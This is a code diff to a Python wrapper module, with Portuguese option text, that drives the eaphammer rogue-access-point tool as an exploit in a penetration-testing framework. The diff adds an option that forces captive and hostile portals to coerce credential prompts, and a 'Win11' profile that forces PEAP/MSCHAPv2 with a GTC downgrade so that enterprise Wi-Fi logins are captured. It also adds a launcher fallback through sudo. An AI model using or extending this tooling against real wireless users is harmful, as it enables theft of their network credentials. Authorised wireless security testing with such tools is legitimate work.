@@ -17,7 +17,7 @@ Improvements from upstream s0lst1c3/eaphammer issues/PRs:
   - ESSID escaping for special characters (airgeddon #655)
 
 License: GPL-3.0 (subprocess only, no code import)
-Version: 1.1.0
+Version: 1.2.0
 """
 
 from __future__ import annotations
@@ -77,6 +77,10 @@ class Exploit(Exploit):
     gtc_downgrade = OptBool(False, "Forçar --negotiate gtc-downgrade (com wpa-eap)")
     captive_portal = OptBool(False, "Modo captive portal (--captive-portal)")
     hostile_portal = OptBool(False, "Modo hostile portal (--hostile-portal)")
+    http_auth_coercion = OptBool(
+        False,
+        "Perfil de coerção HTTP auth (força captive+hostile para prompts de credencial)",
+    )
     karma = OptBool(False, "KARMA / MANA (--karma)")
     loud_karma = OptBool(False, "Loud KARMA (--loud)")
     pmkid = OptBool(False, "Captura PMKID clientless (--pmkid)")
@@ -105,8 +109,43 @@ class Exploit(Exploit):
     wpa_passphrase = OptString("", "PSK do AP se --auth wpa-psk (--wpa-passphrase)")
     wpa_version = OptString("", "Versão WPA: 1 | 2 (--wpa-version)")
     lhost = OptString("", "IP do AP rogue (--lhost; vazio = padrão eaphammer)")
+    win11_workaround = OptBool(
+        False,
+        "Perfil de compatibilidade Win11 para captura PEAP/MSCHAPv2",
+    )
     debug = OptBool(False, "Saída debug (--debug)")
     dry_run = OptBool(False, "Mostrar comando sem executar")
+
+    def _preflight_build(self, cmd: List[str]) -> List[str]:
+        """Valida comando e tenta fallback de launcher para layouts diferentes."""
+        try:
+            probe = subprocess.run(
+                cmd + ["--help"],
+                capture_output=True,
+                text=True,
+                timeout=5,
+                check=False,
+            )
+            if probe.returncode in (0, 1, 2):
+                return cmd
+        except Exception:
+            pass
+
+        fallback = ["sudo", "python3", "-m", "eaphammer"]
+        try:
+            probe_fb = subprocess.run(
+                fallback + ["--help"],
+                capture_output=True,
+                text=True,
+                timeout=5,
+                check=False,
+            )
+            if probe_fb.returncode in (0, 1, 2):
+                return fallback
+        except Exception:
+            pass
+
+        return cmd
 
     def _eap_phase_presets(self) -> Tuple[str, str]:
         """Retorna (phase_1_methods, phase_2_methods) conforme ``eap_type``."""
@@ -219,6 +258,12 @@ class Exploit(Exploit):
         elif mode == "creds":
             cmd.append("--creds")
 
+        if self.http_auth_coercion:
+            if "--captive-portal" not in cmd:
+                cmd.append("--captive-portal")
+            if "--hostile-portal" not in cmd:
+                cmd.append("--hostile-portal")
+
         if self.debug:
             cmd.append("--debug")
 
@@ -290,6 +335,14 @@ class Exploit(Exploit):
             if self.gtc_downgrade:
                 cmd.extend(["--negotiate", "gtc-downgrade"])
 
+        if self.win11_workaround and auth == "wpa-eap":
+            if "--phase-1-methods" not in cmd:
+                cmd.extend(["--phase-1-methods", "PEAP"])
+            if "--phase-2-methods" not in cmd:
+                cmd.extend(["--phase-2-methods", "MSCHAPV2,GTC"])
+            if "--negotiate" not in cmd:
+                cmd.extend(["--negotiate", "gtc-downgrade"])
+
         if mode == "eap_spray":
             if not (self.essid or "").strip():
                 raise ValueError("eap_spray requer essid (-e).")
@@ -326,7 +379,7 @@ class Exploit(Exploit):
     def run(self) -> None:
         """Executa o eaphammer como subprocesso."""
         try:
-            cmd = self._build_command()
+            cmd = self._preflight_build(self._build_command())
         except (FileNotFoundError, ValueError) as err:
             print_error(str(err))
             return
